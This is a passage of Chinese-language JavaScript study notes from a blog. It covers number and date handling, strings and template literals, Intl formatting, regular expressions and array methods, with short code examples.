href="#1-6数字和日期" class="headerlink" title="1.6数字和日期"></a>1.6数字和日期</h2><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>js内的数字均为<strong>双精度浮点类型</strong>（介于±2^−1023 和 ±2^+1024 之间的数字）。</p><p>整数数值仅在 ±(2^53 - 1) 的范围内可以表示准确。</p><p>数字类型还能表示<strong>三种符号值</strong>：</p><ul><li><code>+</code> <code>Infinity</code>（正无穷）</li><li><code>-</code> <code>Infinity</code>（负无穷）</li><li><code>NaN</code> (not-a-number，非数字)</li></ul><p>可以使用四种数字进制：二、八、十、十六。</p><ul><li><strong>二进制</strong>数字：<strong>0b</strong>（0B）开头。</li><li><strong>八进制</strong>数字：<strong>0</strong>（0o、0O）开头。假如0后的数字不在0-7的范围内，转换为十进制。<ul><li>ES5严格模式下进制使用八进制语法（因为八进制不是ES5规范的一部分，但数字前加0就可以被所有浏览器支持：<code>0644 === 420</code> 而且 &#96;”\045” &#x3D;&#x3D;&#x3D; “%”）。</li><li>ES6使用八进制，使用前缀”0o“</li></ul></li><li><strong>十六进制</strong>数字：<strong>0X</strong>（0x）开头。</li></ul><h4 id="Number对象"><a href="#Number对象" class="headerlink" title="Number对象"></a>Number对象</h4><p>内置的Number对象有一些有关数字的常量属性，不可更改，但可以使用。</p><ul><li><p>属性</p><ul><li><p>Number.MAX_VALUE —— 最大值</p></li><li><p>Number.MIN_VALUE ——最小值</p></li><li><p>Number.NaN —— 非数字</p></li><li><p>Number.POSITIVE_INFINITY —— 正无穷，溢出时返回</p></li><li><p>Number.NEGATIVE_INFINITY —— 负无穷，溢出时返回</p></li><li><p>Number.MIN_SAFE_INTEGER、Number.MAX_SAFE_INTEGER  —— JavaScript 最小&#x2F;最大安全整数。</p></li><li><p>Number.EPSILON —— 表示 1 与大于 1 的最小浮点数之间的差值。</p><ul><li>&#96;&#96;&#96;js<br>const result &#x3D; Math.abs(0.2 - 0.3 + 0.1);<br>console.log(result &lt; Number.EPSILON);<br>&#x2F;&#x2F; Expected output: true<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>- 方法<br><br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>parse<span class="hljs-constructor">Float()</span> —— 把字符串参数解析成浮点数，和全局方法 parse<span class="hljs-constructor">Float()</span> 作用一致。<br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>parse<span class="hljs-constructor">Int()</span> —— 把字符串解析成特定基数对应的整型数字，和全局方法 parse<span class="hljs-constructor">Int()</span> 作用一致。<br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>is<span class="hljs-constructor">Finite()</span> —— 判断传递的值是否为有限数字。<br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>is<span class="hljs-constructor">Integer()</span> —— 判断传递的值是否为整数。<br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>is<span class="hljs-constructor">NaN()</span> —— 判断传递的值是否为 NaN.<br>  - <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>is<span class="hljs-constructor">SafeInteger()</span> —— 判断传递的值是否为安全整数。<br><br>- 数字类型原型上的方法<br><br>  - <span class="hljs-keyword">to</span><span class="hljs-constructor">Exponential()</span> ——返回一个数字的指数形式的字符串<br><br>    ```js<br>    <span class="hljs-keyword">function</span> expo(x, f) &#123;<br>      return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Number</span>.</span></span>parse<span class="hljs-constructor">Float(<span class="hljs-params">x</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">Exponential(<span class="hljs-params">f</span>)</span>;<br>    &#125;<br>    <br>    console.log(expo(<span class="hljs-number">123456</span>, <span class="hljs-number">2</span>));<br>    <span class="hljs-comment">// Expected output: &quot;1.23e+5&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>toFixed() —— 使用定点表示法来格式化该数值（小数点保留位数）。</p></li><li><p>toPrecision() —— 返回一个指定精度的数字字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">precise</span>(<span class="hljs-params">x</span>) &#123;<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">toPrecision</span>(<span class="hljs-number">4</span>);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">precise</span>(<span class="hljs-number">123.456</span>));<br><span class="hljs-comment">// Expected output: &quot;123.5&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h4><p>内置的Math数学常项和函数也有一些属性和方法。</p><p>例如PI属性、sin()方法等。</p><ul><li>abs() —— 绝对值</li><li>floor(),ceil() —— 返回 <u>小于等于&#x2F;大于等于</u> 参数的最大整数</li><li>random() —— 返回0和1之间的随机数</li><li>sqrt() —— 平方根</li><li>round() —— 四舍五入后最接近的整数</li><li>更多，详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math">Math</a>。</li></ul><h3 id="日期对象"><a href="#日期对象" class="headerlink" title="日期对象"></a>日期对象</h3><p>js没有日期数据类型，但可以使用<strong>Date对象</strong>和其方法来处理日期和时间。</p><p>Date对象则基于 <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_16">Unix Time Stamp</a>，即自 <u>1970 年 1 月 1 日（UTC）</u>起经过的毫秒数。</p><p><strong>创建</strong>一个日期对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> dateObjectName = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>([parameters]);<br></code></pre></td></tr></table></figure><ul><li>参数parameters的格式：<ul><li>无参数。例如今天<code>today = new Date();</code>.</li><li>一个符合以下格式的表示日期的字符串：”月 日，年 时：分：秒”。例如： <code>var Xmas95 = new Date(&quot;December 25, 1995 13:30:00&quot;)。</code>如果你省略时、分、秒，那么他们的值将被设置为 0。</li><li>一个年，月，日的整型值的集合，例如： <code>var Xmas95 = new Date(1995, 11, 25)</code>。</li><li>一个年，月，日，时，分，秒的集合，例如： <code>var Xmas95 = new Date(1995, 11, 25, 9, 30, 0);</code>.</li></ul></li></ul><p>Date对象的方法分为以下几类：</p><ul><li>set：设置</li><li>get：获取</li><li>to：返回Date对象字符串格式的值</li><li>parse和UTC方法：解析Date字符串</li></ul><p>示例：返回当前时间的数字时钟</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">JSClock</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>  <span class="hljs-keyword">var</span> hour = time.<span class="hljs-title function_">getHours</span>();<br>  <span class="hljs-keyword">var</span> minute = time.<span class="hljs-title function_">getMinutes</span>();<br>  <span class="hljs-keyword">var</span> second = time.<span class="hljs-title function_">getSeconds</span>();<br>  <span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;&quot;</span> + (hour &gt; <span class="hljs-number">12</span> ? hour - <span class="hljs-number">12</span> : hour);<br>  <span class="hljs-keyword">if</span> (hour == <span class="hljs-number">0</span>) temp = <span class="hljs-string">&quot;12&quot;</span>;<br>  temp += (minute &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;:0&quot;</span> : <span class="hljs-string">&quot;:&quot;</span>) + minute;<br>  temp += (second &lt; <span class="hljs-number">10</span> ? <span class="hljs-string">&quot;:0&quot;</span> : <span class="hljs-string">&quot;:&quot;</span>) + second;<br>  temp += hour &gt;= <span class="hljs-number">12</span> ? <span class="hljs-string">&quot; P.M.&quot;</span> : <span class="hljs-string">&quot; A.M.&quot;</span>;<br>  <span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-comment">//&quot;10:26:25 A.M.&quot;</span><br></code></pre></td></tr></table></figure><h2 id="1-7文本格式化"><a href="#1-7文本格式化" class="headerlink" title="1.7文本格式化"></a>1.7文本格式化</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>JS 中的 String 类型用于表示文本型的数据。它是由无符号整数值（16bit）作为元素而组成的集合。</p><p>字符串内的每个元素在字符串中占据一个位置。index从0开始。</p><h4 id="String字面量"><a href="#String字面量" class="headerlink" title="String字面量"></a>String字面量</h4><ul><li>可以使用<strong>单引号</strong>或<strong>双引号</strong>创建简单的字符串</li><li>转义序列创建更复杂的字符串<ul><li><code>\x</code> —— 十六进制</li><li><code>\u</code> —— unicode</li></ul></li></ul><h4 id="String对象"><a href="#String对象" class="headerlink" title="String对象"></a>String对象</h4><p>String对象是对原始string类型的<strong>封装</strong>。</p><p>可以在String字面值上使用String对象的方法，因为JS会自动把String字面值转换为一个<strong>临时的String对象</strong>，调用其方法后再丢弃。</p><p>除非必要，应该<strong>尽量使用String字面值</strong>。</p><p>因为String对象的某些行为可能并不符合预期。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> firstString = <span class="hljs-string">&quot;2 + 2&quot;</span>; <span class="hljs-comment">//创建一个字符串字面量</span><br><span class="hljs-keyword">const</span> secondString = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;2 + 2&quot;</span>); <span class="hljs-comment">// 创建一个字符串对象</span><br><span class="hljs-built_in">eval</span>(firstString); <span class="hljs-comment">// 返回数字 4</span><br><span class="hljs-built_in">eval</span>(secondString); <span class="hljs-comment">// 返回包含 &quot;2 + 2&quot; 的字符串对象</span><br></code></pre></td></tr></table></figure><p>String对象含有许多方法，例如：</p><ul><li><strong>CharAt()<strong>：返回一个由给定索引处的</strong>单个</strong> UTF-16 码元构成的新字符串。</li><li><strong>indexOf()</strong>, <strong>lastIndexOf()</strong> ：返回字符串中指定子串的位置&#x2F;最后位置。</li><li>**concat()**：连接字符串</li><li><strong>toLowerCase(), toUpperCase()</strong> —— 分别返回字符串的小写表示和大写表示。</li><li>match, replace, search —— 通过正则表达式来工作。</li></ul><h4 id="多行模板字符串"><a href="#多行模板字符串" class="headerlink" title="多行模板字符串"></a>多行模板字符串</h4><p>模板字符串是一种允许内嵌表达式的 String 字面值。可以用它实现多行字符串或者字符串内插等特性。</p><p>模板字符串使用反勾号 (&#96;&#96;&#96; &#96;) 包裹内容。模板字符串可以包含占位符。占位符用美元符号和花括号标识 (${expression}).</p><h5 id="多行"><a href="#多行" class="headerlink" title="多行"></a>多行</h5><p>使用模板字符串，可以多行显示且无需插入转义符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`string text line 1</span><br><span class="hljs-string">string text line 2`</span>);<br><span class="hljs-comment">// &quot;string text line 1</span><br><span class="hljs-comment">// string text line 2&quot;</span><br></code></pre></td></tr></table></figure><h5 id="字符串嵌入表达式"><a href="#字符串嵌入表达式" class="headerlink" title="字符串嵌入表达式"></a>字符串嵌入表达式</h5><p>模板字符串，可以使用语法糖让嵌入功能的实现代码更具可读性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> five = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> ten = <span class="hljs-number">10</span>;<br><span class="hljs-comment">//普通方法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-string">&quot;Fifteen is &quot;</span> + (five + ten) + <span class="hljs-string">&quot; and not &quot;</span> + (<span class="hljs-number">2</span> * five + ten) + <span class="hljs-string">&quot;.&quot;</span>,<br>);<br><span class="hljs-comment">//使用模板字符串</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Fifteen is <span class="hljs-subst">$&#123;five + ten&#125;</span> and not <span class="hljs-subst">$&#123;<span class="hljs-number">2</span> * five + ten&#125;</span>.`</span>);<br><span class="hljs-comment">// &quot;Fifteen is 15 and not 20.&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Intl国际化"><a href="#Intl国际化" class="headerlink" title="Intl国际化"></a>Intl国际化</h3><p><strong><code>Intl</code></strong> 对象是 ECMAScript 国际化 API 的一个命名空间，它提供了精确的字符串对比、数字格式化，和日期时间格式化。</p><ul><li><p>日期时间格式化：**<code>Intl.DateTimeFormat</code>**对象使日期和时间在特定的环境下格式化。</p></li><li><p>数字格式化：**<code>Intl.NumberFormat</code>** 对象能使数字在特定的语言环境下格式化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> hanDecimalRMBInChina = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intl</span>.<span class="hljs-title class_">NumberFormat</span>(<span class="hljs-string">&quot;zh-CN-u-nu-hanidec&quot;</span>, &#123;<br>  <span class="hljs-attr">style</span>: <span class="hljs-string">&quot;currency&quot;</span>,<br>  <span class="hljs-attr">currency</span>: <span class="hljs-string">&quot;CNY&quot;</span>,<br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hanDecimalRMBInChina.<span class="hljs-title function_">format</span>(<span class="hljs-number">1314.25</span>)); <span class="hljs-comment">// ￥ 一，三一四。二五</span><br></code></pre></td></tr></table></figure></li><li><p>定序：**<code>Intl.Collator</code>** 对象用于语言敏感的字符串比较。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;ä&#x27;</span>].<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intl</span>.<span class="hljs-title class_">Collator</span>(<span class="hljs-string">&#x27;de&#x27;</span>).<span class="hljs-property">compare</span>));<br><span class="hljs-comment">// Expected output: Array [&quot;a&quot;, &quot;ä&quot;, &quot;z&quot;, &quot;Z&quot;]</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-8正则表达式"><a href="#1-8正则表达式" class="headerlink" title="1.8正则表达式"></a>1.8正则表达式</h2><p><em><a href="https://sheepandbread.github.io/2023/10/13/2023/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">点此查看</a>有关正则表达式的笔记。</em></p><p>在js中，正则表达式也是对象。</p><p><strong>创建</strong>正则表达式（两种方法）：</p><ol><li><code>/正则表达式字面量/</code></li><li>RegExp对象的构造函数：<code>new RegExp()</code></li></ol><p>使用正则表达式：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec"><code>exec</code></a></td><td>一个在字符串中<strong>执行查找</strong>匹配的 RegExp 方法，它返回一个数组（未匹配到则返回 null）。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test"><code>test</code></a></td><td>一个在字符串中<strong>测试</strong>是否匹配的 RegExp 方法，它返回 true 或 false。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match"><code>match</code></a></td><td>一个在字符串中<strong>执行查找</strong>匹配的 String 方法，它返回一个数组，在未匹配到时会返回 null。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll"><code>matchAll</code></a></td><td>一个在字符串中<strong>执行查找</strong><u>所有</u>匹配的 String 方法，它返回<u>一个迭代器</u>（iterator）。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/search"><code>search</code></a></td><td>一个在字符串中<strong>测试</strong>匹配的 String 方法，它返回匹配到的<u>位置索引</u>，或者在失败时返回 -1。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace"><code>replace</code></a></td><td>一个在字符串中执行查找匹配的 String 方法，并且使用<strong>替换</strong>字符串替换掉匹配到的子字符串。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/split"><code>split</code></a></td><td>一个使用正则表达式或者一个固定字符串<strong>分隔</strong>一个字符串，并将分隔后的子字符串存储到数组中的 <code>String</code> 方法。</td></tr></tbody></table><p>使用选择：</p><ul><li>只是想知道能否有匹配  —— test、search</li><li>想要匹配并获得更多信息 —— exec、match</li></ul><h3 id="通过标志进行高级搜索"><a href="#通过标志进行高级搜索" class="headerlink" title="通过标志进行高级搜索"></a>通过标志进行高级搜索</h3><p>正则表达式有六个可选参数 (<code>flags</code>) 。这些参数既可以单独使用也能以任意顺序一起使用，并且被包含在正则表达式实例中。</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td><code>g</code></td><td>全局搜索。</td></tr><tr><td><code>i</code></td><td>不区分大小写搜索。</td></tr><tr><td><code>m</code></td><td>多行搜索。</td></tr><tr><td><code>s</code></td><td>允许 <code>.</code> 匹配换行符。</td></tr><tr><td><code>u</code></td><td>使用 unicode 码的模式进行匹配。</td></tr><tr><td><code>y</code></td><td>执行“粘性 (<code>sticky</code>)”搜索，匹配从目标字符串的当前位置开始。</td></tr></tbody></table><p>语法：</p><ul><li><code>var re = /pattern/flags;</code></li><li><code>var re = new RegExp(&quot;pattern&quot;, &quot;flags&quot;);</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> re = <span class="hljs-regexp">/\w+\s/g</span>;<br><span class="hljs-comment">//等同于</span><br><span class="hljs-keyword">var</span> re = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;\\w+\\s&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-9索引集合类"><a href="#1-9索引集合类" class="headerlink" title="1.9索引集合类"></a>1.9索引集合类</h2><blockquote><p>按索引值排序的数据集合。包括数组和类数组结构，如 Array 对象和 TypedArray 对象。</p></blockquote><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是由<strong>名称</strong>和<strong>索引引用的值</strong>构成的<strong>有序</strong>列表。</p><p>js中没有明确的数组数据类型。可以使用预定义的<code>Array</code>对象及其方法来处理数组。</p><p><strong>创建</strong>数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> arr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(element0, element1, <span class="hljs-comment">/* … ,*/</span> elementN);<br><span class="hljs-keyword">const</span> arr2 = <span class="hljs-title class_">Array</span>(element0, element1, <span class="hljs-comment">/* … ,*/</span> elementN);<br><span class="hljs-keyword">const</span> arr3 = [element0, element1, <span class="hljs-comment">/* … ,*/</span> elementN];<br></code></pre></td></tr></table></figure><ul><li>Array()内只有单个Number时，会被解释为arrayLength。但必须为整数，否则报错。</li></ul><p>创建长度不为0，但没有任何元素的数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 这种方式...</span><br><span class="hljs-keyword">const</span> arr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(arrayLength);<br><br><span class="hljs-comment">// ...与这种方式会形成相同数组</span><br><span class="hljs-keyword">const</span> arr2 = <span class="hljs-title class_">Array</span>(arrayLength);<br><br><span class="hljs-comment">// 这个效果也一样</span><br><span class="hljs-keyword">const</span> arr3 = [];<br>arr3.<span class="hljs-property">length</span> = arrayLength;<br></code></pre></td></tr></table></figure><p> 数组也可以被赋值为<strong>新对象</strong>或<strong>现有对象的属性</strong>。</p><p><strong>引用</strong>数组元素：因为元素也是属性，可以使用属性访问器来访问。</p><ul><li><p>属性访问器语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">object.<span class="hljs-property">property</span><br>object[<span class="hljs-string">&#x27;property&#x27;</span>]<br></code></pre></td></tr></table></figure></li></ul><p>在实现层面，JavaScript实际上是将元素作为<u>标准的对象属性</u>来存储，把<u>数组索引作为属性名</u>。</p><p><strong>遍历数组</strong></p><ul><li><p>使用for循环，length作为判断条件</p></li><li><p>for循环，但以下标查看元素是否存在作为循环条件（更高效）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> divs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;div&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>, div; (div = divs[i]); i++) &#123;<br>  <span class="hljs-comment">/* 以某种方式处理 div */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>**forEach()**方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> colors = [<span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-string">&quot;green&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>];<br>colors.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">color</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(color));<br><span class="hljs-comment">// red</span><br><span class="hljs-comment">// green</span><br><span class="hljs-comment">// blue</span><br></code></pre></td></tr></table></figure><ul><li>未赋值的不会再forEach循环迭代。但手动赋值为undefined会被列出。</li></ul></li><li><p>由于JavaScript被保存为标准对象属性，因此不建议使用for…in循环遍历。因为普通元素和所有可枚举属性都将被列出。</p></li></ul><h3 id="数组方法"><a href="#数组方法" class="headerlink" title="数组方法"></a>数组方法</h3><ul><li><p><strong>concat()</strong> ：<strong>连接</strong>两个或多个数组，并返回一个新的数组</p></li><li><p><strong>join()</strong> ：将数组中的所有元素<strong>连接成一个字符串</strong>。参数为分割符。</p></li><li><p><strong>push()</strong> ：数组<strong>末尾添加</strong>元素，返回length。</p></li><li><p><strong>unshift()</strong> ： 在数组<strong>开头添加</strong>元素，返回length。</p></li><li><p><strong>pop()</strong> ：从数组中<strong>移出最后一个</strong>元素，并返回该元素。</p></li><li><p><strong>shift()</strong> ：从数组中<strong>移出第一个</strong>元素，并返回该元素。</p></li><li><p><strong>slice()</strong> : 从数组中<strong>提取</strong>一个片段，并作为新数组返回。参数为开始，结束索引。</p></li><li><p><strong>at()</strong> : 返回指定索引出的元素。索引超出范围，返回undefined。</p></li><li><p><strong>splice()</strong> ：移出一些元素，[并替换它们]，返回从数组中删除的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> myArray = [<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>];<br>myArray.<span class="hljs-title function_">splice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-comment">//Array(3) [ &quot;2&quot;, &quot;3&quot;, &quot;4&quot; ]</span><br>myArray <span class="hljs-comment">//Array(6) [ &quot;1&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;5&quot; ]</span><br></code></pre></td></tr></table></figure></li><li><p><strong>reverse()</strong> ：翻转数组。</p></li><li><p><strong>flat()</strong> ：返回一个新的数组，并根据指定深度递归地将所有子数组元素拼接到新的数组中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]]];<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2.<span class="hljs-title function_">flat</span>());<br><span class="hljs-comment">// expected output: Array [0, 1, 2, Array [3, Array [4, 5]]]</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2.<span class="hljs-title function_">flat</span>(<span class="hljs-number">2</span>));<br><span class="hljs-comment">// expected output: Array [0, 1, 2, 3, Array [4, 5]]</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2.<span class="hljs-title function_">flat</span>(<span class="hljs-title class_">Infinity</span>));<br><span class="hljs-comment">// expected output: Array [0, 1, 2, 3, 4, 5]</span><br></code></pre></td></tr></table></figure></li><li><p><strong>sort()</strong> : 数组排序。可以ay接受回调函数来决定如何比较数组元素</p><ul><li><p>sort(compareFn)：非 <code>undefined</code> 的数组元素都会按照比较函数的返回值进行排序。</p><p>常用compare：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//升序</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compareNumbers</span>(<span class="hljs-params">a, b</span>) &#123;<br>  <span class="hljs-keyword">return</span> a - b;<br>&#125;<br><span class="hljs-comment">//某个案例(按sortType状态升降序）：</span><br>arr.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">p1,p2</span>)=&gt;</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span> === <span class="hljs-number">1</span> ? p2.<span class="hljs-property">age</span>-p1.<span class="hljs-property">age</span>:p1.<span class="hljs-property">age</span>-p2.<span class="hljs-property">age</span>;<br>&#125;)<br><span class="hljs-keyword">return</span> arr;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>indexOf()</strong> ：数组中搜索参数元素，并返回第一个匹配的结果。正向搜索。</p></li><li><p><strong>lastIndexOf()</strong> ：和indexOf类似，但反向搜索。</p></li><li><p>以下为迭代方法。</p></li><li><p><strong>forEach()</strong> : 对数组中的每个元素执行 <code>callback</code> 并返回 <code>undefined</code>。</p></li><li><p><strong>map()</strong> : 返回由每个数组元素上执行 <code>callback</code> 